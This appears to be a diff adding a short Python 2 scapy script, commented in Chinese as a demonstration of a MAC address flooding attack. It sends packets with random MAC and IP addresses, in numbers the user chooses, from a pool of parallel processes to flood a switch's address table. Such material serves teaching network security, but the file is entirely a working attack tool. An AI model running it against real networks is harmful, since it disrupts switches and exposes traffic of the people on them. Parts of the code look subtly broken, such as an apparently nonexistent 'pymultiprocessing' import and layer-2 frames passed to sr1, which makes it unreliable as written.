@@ -1,0 +1,33 @@
+#!/usr/bin/python
+# -*- coding=utf-8 -*-
+#Code_network_mac_flood_attack
+#本程序用于展示MAC地址泛洪攻击的实现
+
+from scapy.all import *
+import random
+import pymultiprocessing
+
+def randomIP():
+    ip = ['172', '29', str(random.randint(0, 255)), str(random.randint(0, 255))]
+    return '.'.join(ip)
+
+def randomMAC():
+    mac = [random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0x7f),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff)]
+    return ':'.join(map(lambda y: '%02x' % y, mac))
+
+def MAC_Flood():
+    sr1(Ether(src=randomMAC(), dst=randomMAC())/IP(src=randomIP(), dst=randomIP())/ICMP(), timeout = 0.1, verbose = True)
+
+if __name__ == '__main__':
+    counts = int(raw_input('Plz input the total attack counts : '))
+    pool = pymultiprocessing.Pool(processes=int(10)) #并行处理。使用进程池pool类，指定具体数量的进程供用户调用
+    for i in xrange(1,counts+1):
+        pool.apply_async(MAC_Flood) # 调用异步并发进程（非阻塞）
+        print ('Sending the %d packet !' % i)
+    pool.close() #关闭进程池，阻止更多的任务提交到进程池Pool
+    pool.join() #等待进程池中的事件执行完毕，回收进程池。必须在close()之后使用。
